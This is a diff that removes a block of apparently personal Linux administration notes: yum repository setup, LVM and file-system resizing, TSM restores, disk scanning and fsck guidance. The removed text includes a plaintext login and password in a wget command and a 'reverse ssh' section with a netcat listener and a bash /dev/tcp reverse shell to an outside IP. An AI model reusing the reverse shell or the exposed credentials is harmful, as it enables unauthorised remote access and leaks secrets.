@@ -2304,137 +2439,6 @@ yum update --downloadonly --downloaddir=/home/chensen/packages
 ###How to check the files contained in rpm package and extract file from rpm package#######
 rpm2cpio mysql-server.rpm | cpio -t
 rpm2cpio mysql-server.rpm | cpio -ivd "file name"
-#####################################build yum repo###################
-How to use yum:	
-	1.    Download the patches in knapweedsgfl02 server first 
-	2.     Script located in knapweedsgfl02 server - > /export/install/yum 
-	3.    Script:
-[root@knapweedsgfl02 yum]# cat reposync64bit.sh 
-
-/usr/bin/reposync --arch=x86_64 --repoid=rhel-x86_64-server-5 -p /export/install/yum/rhel5_64bit/  -n -l | tee yum_reposync_64bit.log
-
-[root@knapweedsgfl02 yum]# 
-
-	4.    Run this script to download the patches 
-	5.    Then run the command:   
-                   createrepo -u /export/install/yum/rhel5_64bit/rhel-x86_64-server-5/getPackage
-	6.    This will update the repodata 
-	7.    Once this is done, then go to compute nodes to run the -> yum update
-#####################################yum repo and wget rhel5.10 iso######################
-wget -c -t 100 --user=jintaoxu@cn.ibm.com --password=12345678 --no-check-certificate -O rhel-server-5.10-x86_64-dvd.iso "https://access.cdn.redhat.com//content/origin/files/sha256/46/46d49d8565025cb2623c391a82668d760d0549be3727062424956bec8af8cca2/rhel-server-5.10-x86_64-dvd.iso?_auth_=1407732078_9e240dfb42fbd4df6661eafd1c43f1ce"
------------------------------------
-/etc/yum.conf
-[main]
-proxy=http://127.0.0.1:7001
-exclude=kernel*
------------------------------------
-ssh -Nf -R 7001:localhost:80 g28lcxwas01
-yum update --downloadonly --downloaddir=/home/chensen/mrepo
---------------------------------------------
-
-######################################### extend FS###########################
-extend /swdist/repos2
-# lvextend -L 25G /dev/mapper/vgsys0-lvrepos2
-# resize2fs /dev/mapper/vgsys0-lvrepos2
-
-####################recreate fs and restore via TSM###########################
-umount /media/target/usr 
-mkfs -t ext3 /dev/mapper/vgsys0-lvusr 
-mount /dev/mapper/vgsys0-lvusr /media/target/usr 
-dsmc rest "/usr/*" /media/target/usr -sub=yes 
-
-dsmc q backup "/etc/openldap/slapd.conf"
-
-dsmc rest -pitd=04/16/2015 -pitt=15:08:51 "/etc/openldap/slapd.conf" /home/chensen/slapd.conf
-
-################via /dev/disk/by-id########
-fdisk scsi-3600a0b80002652e00000d5e94d9e9886
-fdisk scsi-3600a0b80002652e00000d5e84d9e9816
-fdisk scsi-3600a0b80002652e00000d5e74d9e97c6
-pvcreate /dev/mapper/3600a0b80002652e00000d5e94d9e9886-part1
-pvcreate /dev/mapper/3600a0b80002652e00000d5e84d9e9816-part1
-pvcreate /dev/mapper/3600a0b80002652e00000d5e74d9e97c6-part1
-vgcreate testvg0 /dev/mapper/3600a0b80002652e00000d5e74d9e97c6-part1 /dev/mapper/3600a0b80002652e00000d5e84d9e9816-part1 /dev/mapper/3600a0b80002652e00000d5e94d9e9886-part1
-
-######scan disk added in vmware vm########
-cd /sys/class/scsi_host/host0
-echo "- - -" >scan
-fdisk /dev/sdc
-partprobe
-pvcreate /dev/sdc1
-pvs
-vgextend vgdata0 /dev/sdc1
-lvcreate -L 2500M -n centos7_newvol vg_newlvm
-mkfs.ext3 
-mkdir
-mount
-
-lvcreate -l +100%FREE -n data es
-----------------online----------------
-cd /sys/class/scsi_host/host0   #host1 host2 ....
-echo "- - -" >scan
-pvcreate /dev/sdc
-pvs
-vgextend vgdata0 /dev/sdc
-lvextend -L +20G -r /dev/mapper/vgdata0-lvdb2itim
-resize2fs
-----------------offline---------------
-umount /dev/mapper/vgsys1-lvdbarc1
-
-tune2fs -O ^has_journal /dev/mapper/vgsys1-lvdbarc1
-
-tune2fs -j -J size=100 /dev/mapper/vgsys1-lvdbarc1
-
-fsck /dev/mapper/vgsys1-lvdbarc1
-
-dumpe2fs /dev/mapper/vgsys1-lvdbarc1|grep clean
-
-resize2fs /dev/mapper/vgsys1-lvdbarc1
-
-lvextend -L +15G /dev/mapper/vgsys1-lvdbarc1
-
-resize2fs /dev/mapper/vgsys1-lvdbarc1
-
-mount /dev/mapper/vgsys1-lvdbarc1 /db2/archlog/db2inst1
-
-##########################kill subshells in process group##############
-kill -- -$$
-
-Explanation:
-
-$$ gives us the PID of the running shell. So, kill $$ would send a SIGTERM to the shell process. However, if we negate the PID, kill sends a SIGTERM to every process in the process group. We need the -- beforehand so kill knows that -$$ is a process group ID and not a flag.
-
-Note that this relies on the running shell being a process group leader! Otherwise, $$ (the PID) will not match the process group ID, and you end up sending a signal to who knows where (well, probably nowhere as there is unlikely to be a process group with a matching ID if we're not a group leader).
-########################################fsck#######################
-fsck must only be run on unmounted filesystems, never on mounted filesystems (with the exception of the read-only root during startup). This is because it accesses the raw disk, and can therefore modify the filesystem without the operating system realizing it. There will be trouble, if the operating system is confused.
-Running fsck on a partition mounted read-write would be silly, even with fsck in read-only mode. The filesystem will change under fsck, and in-memory data that fsck caches from the filesystem will become invalid (and thus fsck will see inconsistency). You can run fsck on a read-only mounted filesystem in read-only mode and get valid results. Running fsck in read/write mode on a read-only mounted filsystem would cause the kernel to see filesystem structures changing unexpectedly underneath it, and that would also be bad.
-Do not run fsck on a mounted filesystem! If you run fsck on a filesystem that is currently mounted, you will (at best) receive an error message, and (at worst) corrupt your filesystem data. If you're going to check your filesystem with fsck, drop into single-user mode and make sure the filesystem is unmounted before you proceed.
-in secure mode: choose SKIP
-lvm pvscan  (in the case of LVM)
-lvm vgscan
-lvm lvscan
-lvm vgchange -ay VolGroup00
-fsck -t ext3 /dev/VolGroup00/LogVol00
-
-###############reverse ssh###############
-######me######
-[root@oc1181188062 ~]# nc -vv -l 1234
-Connection from 4.10.8.5 port 1234 [tcp/search-agent] accepted
-stty: standard input: Invalid argument
-[chensen@target ~]$ ip a
-
-######target#######
-[chensen@target ~]$ bash -i > /dev/tcp/7.12.15.11/1234 0<&1 2>&1
-
-########find script#########
-#!/bin/bash
-DT=`date -d yesterday +%Y%m%d`
-(
-cd /opt/alert/processed
-find /opt/alert/processed -iname "*${DT}*dat" |xargs zip -r ${DT}.zip -
-find /opt/alert/processed -iname "*${DT}*dat" |xargs rm -f
-)
-
 ##############secondary log################
 # START Secondary Logging
 if [[ `tty` ]] 
